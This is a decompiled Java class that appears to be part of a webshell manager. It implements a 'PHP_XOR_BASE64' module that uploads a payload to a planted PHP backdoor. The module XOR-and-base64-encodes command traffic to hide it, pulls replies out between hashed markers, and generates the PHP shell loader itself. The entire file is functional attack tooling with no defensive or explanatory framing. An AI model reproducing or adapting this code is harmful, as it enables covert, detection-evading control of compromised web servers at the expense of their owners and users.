//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
    Name = "PHP_XOR_BASE64",
    payloadName = "PhpDynamicPayload"
)
public class PhpAAXor implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private byte[] findStrLeft;
    private byte[] findStrRight;
    private String suffix = "php";

    public PhpAAXor() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        this.findStrLeft = findStrMd5.substring(0, 16).getBytes();
        this.findStrRight = findStrMd5.substring(16).getBytes();
        this.shell.putHeader("Content-Type", "application/x-www-form-urlencoded");
        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public byte[] E(byte[] cs) {
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
    }

    public byte[] D(byte[] data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return cs;
    }

    public byte[] findStr(byte[] respResult) {
        return functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), "base64.bin");
    }
}
